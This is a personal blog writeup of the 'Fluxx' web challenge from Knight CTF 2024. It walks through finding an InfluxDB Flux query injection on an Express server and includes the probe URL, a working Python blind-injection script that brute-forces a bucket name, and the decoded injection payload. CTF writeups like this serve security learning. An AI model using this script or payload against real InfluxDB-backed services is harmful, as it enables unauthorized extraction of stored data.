---
layout: post
title: "InfluxDB NoSQL SQL injection | Fluxx web CTF challenge writeup | Knight CTF 2024"
author: "Colleirose"
permalink: /influxdb-injection-nosql-injection-knightctf-2024
date: 2024-01-23
---

<style>
    /* images are fairly large in this writeup specifically, but they aren't everywhere, so this change should be applied here only */
    img {
        width: 50%;
        height: 50%;
    }
</style>

This is the challenge:
<br/>
![challenge name and description](/assets/img/challenge fluxx.png)

Based on the X-Powered-By header being Express on all pages and receiving a <code>Cannot GET /(requested url)</code> on non-existent URLs (e.g. <a href="http://66.228.53.87:9001/a" rel="noopener">66.228.53.87:9001/a</a>), I can infer this is a <a href="https://expressjs.com/" rel="noopener">Express.js</a> server.
<br/>
<img src="https://cdn.discordapp.com/attachments/1194841726163095565/1198507422340358154/image.png?ex=65bf2804&is=65acb304&hm=e6100f755e6fed1f1811b7c852c048c3745f18e73d8a522bebe57997bd84b337&"/>

One of our team member finds https://book.hacktricks.xyz/pentesting-web/nosql-injection then checks finds that visiting <code>http://66.228.53.87:9001/query?data='%20||%201==1//%20%20%20%20or%20%20%20%20'%20||%201==1%00%20%20%20%20%20or%20%20%20%20admin'%20||%20'a'=='a</code> creates an erorr

I search this error online and learn that it's an error related to <a href="https://github.com/influxdata/influxdb" rel="noopener">InfluxDB</a>, which I haven't heard of until this challenge.
<br/>
<img src="https://cdn.discordapp.com/attachments/1194841726163095565/1198512198323011714/image.png?ex=65bf2c77&is=65acb777&hm=e54a3bc3373d4d041b72b951d42801b3487e256700888636c283a9552efe1ca5&"/>

This also matches up with the challenge name and description:
![challenge name and description](/assets/img/challenge fluxx.png)

Searching about SQL injection in InfluxDB, I find <a href="https://rafa.hashnode.dev/influxdb-nosql-injection" rel="noopener">https://rafa.hashnode.dev/influxdb-nosql-injection</a>.

After facing some errors, I go back to the article I was copying this code off of and fix my code.

But this is very inefficient to do manually. I find a script on <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql">book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql</a> that can automate this. It requires a bit of changes, but here's the working script, based on the Hacktricks resource:

```py
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
    print("[i] Looking for char number "+str(i+1))
    for char in alphabet:
        r = requests.get("http://66.228.53.87:9001/query?data=%22)%20%7c%3e%20yield(name%3a%20%221337%22)%20%0d%0abuckets()%20%7c%3e%20filter(fn%3a%20(r)%20%3d%3e%20r.name%20%3d~%20%2f%5e" +flag+char+".*%2f%20and%20die(msg%3ar.name))%20%0d%0a%2f%2f")
        if (r.text != "[]"):
            flag += char
            print("[+] Flag: "+flag)
            break
```

The script then crashes with some error about the connection being aborted but tells me the correct string starts with K

<img src="https://cdn.discordapp.com/attachments/1194841726163095565/1198516018990022656/image.png?ex=65bf3006&is=65acbb06&hm=6daf3321672585f519bc72aad4c5c09a548adb8a33a7433c85a85912689047bf&"/>

So I went back to Burp Suite and tried it again with the K

<img src="https://cdn.discordapp.com/attachments/1194841726163095565/1198516141547597844/image.png?ex=65bf3023&is=65acbb23&hm=a47b3cc0a025b538b9d8c4066d7df9ea0cf41b2ae9d9e7e3470105ab595f66e3&"/>

This flag is correct when submitted:

<img src="https://cdn.discordapp.com/attachments/1194841726163095565/1198516330303860746/image.png?ex=65bf3050&is=65acbb50&hm=93434d1d3de29bb8e78eac99de0a0bfe0361b1ae9965f7a7a9f2da24f7bb74e4&"/>

This is the code with the URI parameters decoded. I don't fully understand what it does because I've never used NoSQL or InfluxDB before.

```
") |> yield(name: "1337") 
buckets() |> filter(fn: (r) => r.name =~ /^K.*/ and die(msg:r.name)) 
//
```

I don't know what the first line does, but the second line calls a function to list buckets called <code>buckets()</code> and filters for buckets with a name that matches the regular expression <code>/^K.*/</code>. If it finds one, it dies with the bucket's name. The third line is a comment.

In retrospect, maybe <code>/^.*/</code> would've worked fine.